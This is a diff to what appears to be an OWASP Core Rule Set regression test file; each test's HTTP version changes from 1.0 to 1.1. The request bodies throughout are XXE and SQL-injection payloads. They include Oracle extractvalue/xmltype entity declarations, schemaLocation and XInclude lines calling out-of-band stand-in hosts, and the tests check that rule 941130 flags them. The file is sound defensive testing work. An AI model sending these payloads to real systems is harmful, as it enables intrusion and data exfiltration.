@@ -32,7 +32,7 @@ tests:
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           uri: "/post"
           data: "var=555-555-0199@example.com'||(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % lbsod SYSTEM \"http://im8vx9fw5e2ibzctphxn9vauwl2m0joncfz5nu.example'||'foo.bar/\">%lbsod;"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             expect_ids: [941130]
@@ -49,7 +49,7 @@ tests:
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           uri: "/post"
           data: "var=<aai xmlns=\"http://a.b/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://a.b/ http://c5ipg3yqo8lcutvn8bghsptofflee424qxdq1f.examplefoo.bar/aai.xsd\">aai</aai>"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             expect_ids: [941130]
@@ -66,7 +66,7 @@ tests:
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           uri: "/post"
           data: "var=abcd'||(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % cgger SYSTEM \"http://ved8pm79xruv3c46hup01827oyuzxtlx9qwjk8.example'||'foo.bar/\">%cgger;"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             expect_ids: [941130]
@@ -83,7 +83,7 @@ tests:
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           uri: "/post"
           data: "var=<acp xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"http://sgc5rj96zows5963jrrx3544qvwtnubvzomfa4.examplefoo.bar/foo\"/></acp>"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             expect_ids: [941130]
@@ -100,7 +100,7 @@ tests:
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           uri: "/post"
           data: "var=/active/LFI/LFI-Detection-Evaluation-POST-200Valid/content.ini'||(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % grorj SYSTEM \"http://yikbtpbc1uyy7f89lxt35b6as1yw1qpudm0co1.example'||'foo.bar/\">%grorj;"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             expect_ids: [941130]
@@ -117,7 +117,7 @@ tests:
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           uri: "/post"
           data: "var=<afa xmlns=\"http://a.b/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://a.b/ http://2mpfxtfg5y22bjcdp1x79faew52420q0er1hp6.examplefoo.bar/afa.xsd\">afa</afa>"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             expect_ids: [941130]
@@ -134,7 +134,7 @@ tests:
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           uri: "/post"
           data: "var=<chj xmlns=\"http://a.b/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://a.b/ http://1pre0sif8x51eifcs006ceddz45084w4kx7ovd.examplefoo.bar/chj.xsd\">chj</chj>"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             expect_ids: [941130]
@@ -151,7 +151,7 @@ tests:
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           uri: "/post"
           data: "var=/content.ini'||(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % dwusu SYSTEM \"http://ehzrs5as0axe6v7pkdsj4r5qrhxcp6da12osch.example'||'foo.bar/\">%dwusu;"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             expect_ids: [941130]
@@ -168,7 +168,7 @@ tests:
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           uri: "/post"
           data: "var=EmptyValue'||(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM \"http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/\">%awpsd;"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             expect_ids: [941130]
@@ -185,7 +185,7 @@ tests:
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           uri: "/post"
           data: "var=file:/boot.ini'||(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % cwtpc SYSTEM \"http://gvft67ouecbgkxlryf6litjs5jbd5htlhd43ss.example'||'foo.bar/\">%cwtpc;"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             expect_ids: [941130]
@@ -202,7 +202,7 @@ tests:
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           uri: "/post"
           data: "var=Matched Data: <!ENTITY % awfke SYSTEM found within ARGS_NAMES:1'||(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % awfke SYSTEM \"http://gj3tu7cu2czg8x9rmful6t7stjzcp4d812osch.example'||'foo.bar/\">%awfke;"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             expect_ids: [941130]
@@ -219,7 +219,7 @@ tests:
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           uri: "/post"
           data: "var=<oez xmlns=\"http://a.b/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://a.b/ http://eygr95rshaeenvop1d9jlrmq8hegib6bu4hx5m.examplefoo.bar/oez.xsd\">oez</oez>"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             expect_ids: [941130]
@@ -236,7 +236,7 @@ tests:
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           uri: "/post"
           data: "var=(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % anwyn SYSTEM \"http://y98bkp2csupyyfz9cxk3wbxaj1pzuzi26vtohd.example'||'foo.bar/\">%anwyn;"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             expect_ids: [941130]
@@ -253,7 +253,7 @@ tests:
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           uri: "/post"
           data: "var=<vqk xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"http://749kfyxln3k7toui76fcrksjeak3nybzzsmlaa.examplefoo.bar/foo\"/></vqk>"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             expect_ids: [941130]
@@ -270,7 +270,7 @@ tests:
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           uri: "/post"
           data: "var=2010-01-01'||(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % fhklu SYSTEM \"http://fzisa6stibffowpq2eakmsnr9ifhii6mueh45t.example'||'foo.bar/\">%fhklu;"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             expect_ids: [941130]
@@ -286,7 +286,7 @@ tests:
             User-Agent: "OWASP CRS test agent"
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           uri: "/post/api/v1/query?q=7XMLNS"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             no_expect_ids: [941130]
@@ -303,7 +303,7 @@ tests:
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           uri: "/post"
           data: "var=<chj%0Axmlns=\"http://a.b/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://a.b/ http://1pre0sif8x51eifcs006ceddz45084w4kx7ovd.examplefoo.bar/chj.xsd\">chj</chj>"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             expect_ids: [941130]
@@ -319,7 +319,7 @@ tests:
             User-Agent: "foo!ENTITY % bar SYSTEM"
             Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           uri: "/get"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             expect_ids: [941130]
